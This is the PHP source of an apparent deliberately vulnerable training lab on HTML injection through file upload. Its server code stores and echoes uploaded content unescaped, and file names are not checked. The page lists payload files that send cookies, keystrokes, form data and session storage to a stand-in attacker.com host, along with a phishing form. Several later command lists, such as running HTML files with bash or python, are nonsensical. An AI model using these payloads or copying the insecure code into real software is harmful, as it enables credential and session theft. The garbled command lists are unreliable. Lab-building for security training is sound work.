<?php
// Lab 3: HTML Injection via File Upload
// Vulnerability: HTML injection attacks through file upload functionality

session_start();

$message = '';
$injected_content = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Simulate HTML injection for uploaded files (vulnerable to injection)
function process_uploaded_html($input) {
    // Vulnerable: Direct output without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    $file_content = $_POST['file_content'] ?? '';
    $file_name = $_POST['file_name'] ?? 'uploaded_file.html';
    $file_type = $_POST['file_type'] ?? 'text/html';
    
    if ($file_content && $file_name) {
        $file_data = [
            'name' => $file_name,
            'content' => $file_content,
            'type' => $file_type,
            'size' => strlen($file_content),
            'uploaded_at' => date('Y-m-d H:i:s')
        ];
        
        // Save file to uploads directory
        if (!file_exists('uploads')) {
            mkdir('uploads', 0755, true);
        }
        
        $file_path = 'uploads/' . $file_name;
        file_put_contents($file_path, $file_content);
        
        $_SESSION['uploaded_files'][] = $file_data;
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File uploaded successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Please provide both file name and content!</div>';
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        $file = $uploaded_files[$file_index];
        $file_path = 'uploads/' . $file['name'];
        if (file_exists($file_path)) {
            unlink($file_path);
        }
        
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}

// Handle HTML injection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['inject_html'])) {
    $user_input = $_POST['html_input'] ?? '';
    
    if ($user_input) {
        $injected_content = process_uploaded_html($user_input);
        $message = '<div class="alert alert-success">HTML content processed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: HTML Injection via File Upload - HTML Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .injected-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to HTML Injection Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: HTML Injection via File Upload</h1>
            <p class="hero-subtitle">HTML injection attacks through file upload functionality</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates HTML injection vulnerabilities that can be exploited through file upload functionality. Attackers can upload files containing malicious HTML content or reference uploaded files that get processed and rendered by the browser.</p>
            <p><strong>Objective:</strong> Use file upload functionality to achieve HTML injection and potentially XSS.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct output without validation
function process_uploaded_html($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-upload me-2"></i>File Upload
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <form method="POST">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file_name" class="form-label">File Name</label>
                                <input type="text" class="form-control" id="file_name" name="file_name" 
                                       placeholder="Enter file name...">
                            </div>
                            <div class="mb-3">
                                <label for="file_type" class="form-label">File Type</label>
                                <select class="form-select" id="file_type" name="file_type">
                                    <option value="text/html">HTML File</option>
                                    <option value="text/plain">Text File</option>
                                    <option value="application/x-php">PHP File</option>
                                    <option value="text/css">CSS File</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="file_content" class="form-label">File Content</label>
                                <textarea class="form-control" id="file_content" name="file_content" 
                                          rows="4" placeholder="Enter file content..."><!DOCTYPE html>
<html>
<head><title>Uploaded HTML</title></head>
<body>
    <h1>Hello World!</h1>
    <p>This is uploaded HTML content.</p>
</body>
</html></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-files me-2"></i>Uploaded Files
                    </div>
                    <div class="card-body">
                        <?php if (empty($uploaded_files)): ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php else: ?>
                            <?php foreach ($uploaded_files as $index => $file): ?>
                                <div class="input-info">
                                    <h5>File <?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['name']); ?></h5>
                                    <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                    <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                    <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                    
                                    <div class="mt-2">
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="inject_html" value="1">
                                            <input type="hidden" name="html_input" value="<?php echo htmlspecialchars($file['content']); ?>">
                                            <button type="submit" class="btn btn-sm btn-primary">View File</button>
                                        </form>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>HTML Injection
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="inject_html" value="1">
                            <div class="mb-3">
                                <label for="html_input" class="form-label">HTML Content to Inject</label>
                                <textarea class="form-control" id="html_input" name="html_input" 
                                          rows="4" placeholder="Enter HTML content..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Inject HTML</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($injected_content): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Injected Content
                    </div>
                    <div class="card-body">
                        <div class="injected-display">
                            <h5>Rendered HTML</h5>
                            <div class="sensitive-data">
                                <?php echo $injected_content; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> HTML Injection via File Upload</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct processing of uploaded HTML files</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>File Upload HTML Injection Examples</h5>
                    <ul>
                        <li><code>malicious.html</code> - Upload HTML file</li>
                        <li><code>&lt;h1&gt;Hello&lt;/h1&gt;</code> - Basic HTML</li>
                        <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> - JavaScript</li>
                        <li><code>&lt;img src="x" onerror="alert(1)"&gt;</code> - XSS</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>File Upload HTML Injection Payloads</h5>
            <p>Upload these files to test HTML injection vulnerabilities:</p>
            
            <h6>1. Basic HTML File (malicious.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Hacked!</title></head>
<body>
    <h1>HACKED!</h1>
    <p>This page has been compromised.</p>
</body>
</html></div>

            <h6>2. XSS HTML File (xss.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>XSS Test</title></head>
<body>
    <h1>XSS Test</h1>
    <script>alert('XSS via File Upload!')</script>
    <img src="x" onerror="alert('XSS via File Upload!')">
</body>
</html></div>

            <h6>3. Phishing HTML File (phishing.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Login Required</title></head>
<body>
    <h1>Please Login</h1>
    <form action="https://attacker.com/steal" method="post">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" value="Login">
    </form>
</body>
</html></div>

            <h6>4. Keylogger HTML File (keylogger.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Keylogger</title></head>
<body>
    <h1>Type something</h1>
    <input type="text" id="input" placeholder="Type here...">
    <script>
        document.getElementById('input').addEventListener('keypress', function(e) {
            fetch('https://attacker.com/keys?key=' + e.key);
        });
    </script>
</body>
</html></div>

            <h6>5. Cookie Stealer HTML File (cookie-stealer.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Cookie Stealer</title></head>
<body>
    <h1>Welcome</h1>
    <script>
        fetch('https://attacker.com/steal?cookie=' + document.cookie);
    </script>
</body>
</html></div>

            <h6>6. Redirect HTML File (redirect.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="0;url=https://attacker.com">
</head>
<body>
    <h1>Redirecting...</h1>
    <script>window.location = 'https://attacker.com';</script>
</body>
</html></div>

            <h6>7. CSS Injection HTML File (css-injection.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head>
    <title>CSS Injection</title>
    <style>
        body { background: red; }
        h1 { color: white; font-size: 50px; }
        @import url('https://attacker.com/malicious.css');
    </style>
</head>
<body>
    <h1>CSS Injected!</h1>
</body>
</html></div>

            <h6>8. Form Hijacking HTML File (form-hijack.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Form Hijacker</title></head>
<body>
    <h1>Submit Form</h1>
    <form id="hijacked-form">
        <input type="text" name="data" placeholder="Enter data">
        <input type="submit" value="Submit">
    </form>
    <script>
        document.getElementById('hijacked-form').addEventListener('submit', function(e) {
            e.preventDefault();
            var data = new FormData(this);
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: data
            });
        });
    </script>
</body>
</html></div>

            <h6>9. Session Hijacking HTML File (session-hijack.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Session Hijacker</title></head>
<body>
    <h1>Session Hijacker</h1>
    <script>
        // Steal session data
        var sessionData = {
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent,
            url: window.location.href
        };
        
        fetch('https://attacker.com/steal', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(sessionData)
        });
    </script>
</body>
</html></div>

            <h6>10. Advanced XSS HTML File (advanced-xss.html):</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head><title>Advanced XSS</title></head>
<body>
    <h1>Advanced XSS</h1>
    <script>
        // Advanced XSS payload
        (function() {
            var script = document.createElement('script');
            script.src = 'https://attacker.com/malicious.js';
            document.head.appendChild(script);
        })();
        
        // Keylogger
        document.addEventListener('keypress', function(e) {
            fetch('https://attacker.com/keys?key=' + e.key);
        });
        
        // Form hijacking
        var forms = document.getElementsByTagName('form');
        for (var i = 0; i < forms.length; i++) {
            forms[i].addEventListener('submit', function(e) {
                var data = new FormData(this);
                fetch('https://attacker.com/forms', {
                    method: 'POST',
                    body: data
                });
            });
        }
    </script>
</body>
</html></div>

            <h6>11. HTML Injection via Uploaded Files:</h6>
            <div class="code-block">cat uploads/malicious.html
head -10 uploads/xss.html
grep "script" uploads/advanced-xss.html
wc -l uploads/phishing.html</div>

            <h6>12. File Processing via Uploaded Files:</h6>
            <div class="code-block">php uploads/malicious.html
python uploads/xss.html
node uploads/advanced-xss.html
ruby uploads/phishing.html</div>

            <h6>13. File Inclusion via Uploaded Files:</h6>
            <div class="code-block">include uploads/malicious.html
require uploads/xss.html
include_once uploads/advanced-xss.html
require_once uploads/phishing.html</div>

            <h6>14. File Execution via Uploaded Files:</h6>
            <div class="code-block">./uploads/malicious.html
bash uploads/xss.html
sh uploads/advanced-xss.html
exec uploads/phishing.html</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Upload malicious HTML files containing XSS</li>
                <li>Execute arbitrary JavaScript through file upload</li>
                <li>Access sensitive files using uploaded HTML</li>
                <li>Bypass file upload restrictions and filters</li>
                <li>Compromise user sessions through file upload</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper file upload validation and sanitization</li>
                    <li>Use whitelist-based file type validation</li>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use proper HTML encoding functions</li>
                    <li>Implement proper output encoding</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns and content</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
